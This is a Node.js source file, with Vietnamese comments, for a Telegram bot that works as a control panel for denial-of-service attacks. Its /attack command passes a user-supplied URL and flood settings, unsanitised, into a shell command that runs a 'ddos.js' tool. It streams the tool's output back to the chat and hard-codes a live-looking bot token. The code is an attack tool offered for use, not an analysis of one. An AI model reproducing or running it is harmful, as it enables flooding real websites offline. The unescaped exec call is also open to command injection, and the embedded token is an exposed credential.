const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const fs = require('fs');

// === cấu hình ===
const TOKEN = "8212996079:AAFV20k2bRap0NAGaPN_EokQKXmD4r_d3uM";
const bot = new TelegramBot(TOKEN, { polling: true });

// Hàm chạy tool
function runTool(chatId, target, req, delay, worker, tcp, options = "") {
    const cmd = `node "ddos.js" ${target} ${req} ${delay} ${worker} ${tcp} ${options}`;
    const child = exec(cmd);

    bot.sendMessage(chatId, `🚀 Đang chạy tool:\n\`${cmd}\``, { parse_mode: "Markdown" });

    child.stdout.on("data", (data) => {
        bot.sendMessage(chatId, `📡 Output:\n${data.substring(0, 300)}`); // tránh spam quá dài
    });

    child.stderr.on("data", (err) => {
        bot.sendMessage(chatId, `❌ Error:\n${err}`);
    });

    child.on("close", (code) => {
        bot.sendMessage(chatId, `✅ Tool dừng (exit code ${code})`);
    });
}

// Lắng nghe lệnh
bot.onText(/\/attack (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const args = match[1].split(" ");
    if (args.length < 5) {
        return bot.sendMessage(chatId, "⚠️ Usage: /attack [url] [req] [delay] [worker] [tcp] [--noproxy|--burst]");
    }

    const [url, req, delay, worker, tcp, ...opts] = args;
    runTool(chatId, url, req, delay, worker, tcp, opts.join(" "));
});

// Help menu
bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, `🤖 Bot Panel Online!
Lệnh khả dụng:
/attack url req delay worker tcp [--noproxy|--burst]
Ví dụ:
/attack https://example.com 1000 10 4 25 --noproxy`);
});